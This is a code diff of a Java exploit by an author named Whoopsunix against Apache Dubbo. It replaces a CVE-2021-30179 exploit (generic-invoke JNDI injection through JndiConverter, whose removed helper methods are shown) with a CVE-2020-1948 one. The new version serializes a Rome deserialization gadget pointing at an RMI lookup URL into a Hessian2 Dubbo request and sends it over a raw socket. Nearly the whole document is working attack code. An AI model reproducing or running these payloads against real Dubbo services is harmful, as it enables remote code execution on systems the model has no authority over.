@@ -1,23 +1,31 @@
 package org.example;
 
-import org.apache.dubbo.common.beanutil.JavaBeanDescriptor;
+//import com.rometools.rome.feed.impl.EqualsBean;
+//import com.rometools.rome.feed.impl.ToStringBean;
+//import com.sun.syndication.feed.impl.EqualsBean;
+//import com.sun.syndication.feed.impl.ToStringBean;
+
 import org.apache.dubbo.common.io.Bytes;
 import org.apache.dubbo.common.serialize.hessian2.Hessian2ObjectOutput;
+import org.springframework.boot.autoconfigure.EnableAutoConfiguration;
 
 import java.io.ByteArrayOutputStream;
 import java.io.OutputStream;
 import java.net.Socket;
-import java.util.HashMap;
 
 /**
  * @author Whoopsunix
- * <p>
- * CVE-2021-30179
- * <p>
- * 2.5.x、[2.6.0, 2.6.8]、[2.7.0, 2.7.9]
+ *
+ * CVE-2020-1948
+ *
+ * 2.5.x、[2.6.0, 2.6.7]、[2.7.0, 2.7.6]、2.7.7
+ * 构建 Socket 后续都是此方式的利用
  */
-public class CVE_2021_30179 {
+@EnableAutoConfiguration
+public class CVE_2020_1948_2 {
     public static void main(String[] args) throws Exception {
+        Object gadget = GadgetBuilder.romePayload("rmi://127.0.0.1:1099/ruzcoc");
+
         // HEADER
         byte[] header = new byte[16];
 
@@ -43,17 +51,12 @@ public class CVE_2021_30179 {
         // 3.version
         out.writeUTF("1.0");
         // 4.methodName
-        out.writeUTF("$invoke");
+        out.writeUTF("sayObject");
         // 5.methodDesc
-        out.writeUTF("Ljava/lang/String;[Ljava/lang/String;[Ljava/lang/Object;");
-        // 6.paramsObject
-        out.writeUTF("sayHello");
+        out.writeUTF("Ljava/lang/Object;");
+        out.writeObject(gadget);
         out.writeObject(new String[]{"java.lang.String"});
 
-        String url = "rmi://127.0.0.1:1099/ruzcoc";
-        bean(out, url);
-//        rawReturn(out, url);
-//        nativeJava(out, "rome.bin");
 
         out.flushBuffer();
 
@@ -72,32 +75,4 @@ public class CVE_2021_30179 {
         outputStream.flush();
         outputStream.close();
     }
-
-    public static void bean(Hessian2ObjectOutput out, String url) throws Exception {
-        JavaBeanDescriptor javaBeanDescriptor = new JavaBeanDescriptor("org.apache.xbean.propertyeditor.JndiConverter", 7);
-        javaBeanDescriptor.setProperty("asText", url);
-        out.writeObject(new Object[]{javaBeanDescriptor});
-        HashMap map = new HashMap();
-        map.put("generic", "bean");
-        out.writeObject(map);
-    }
-
-    public static void rawReturn(Hessian2ObjectOutput out, String url) throws Exception {
-        HashMap map = new HashMap();
-        map.put("class", "org.apache.xbean.propertyeditor.JndiConverter");
-        map.put("asText", url);
-        out.writeObject(new Object[]{map});
-        HashMap map2 = new HashMap();
-        map2.put("generic", "raw.return");
-        out.writeObject(map2);
-    }
-
-    public static void nativeJava(Hessian2ObjectOutput out, String url) throws Exception {
-        byte[] data = java.nio.file.Files.readAllBytes(java.nio.file.Paths.get(url));
-        out.writeObject(new Object[]{data});
-        HashMap map = new HashMap();
-        map.put("generic", "nativejava");
-        out.writeObject(map);
-    }
-
 }
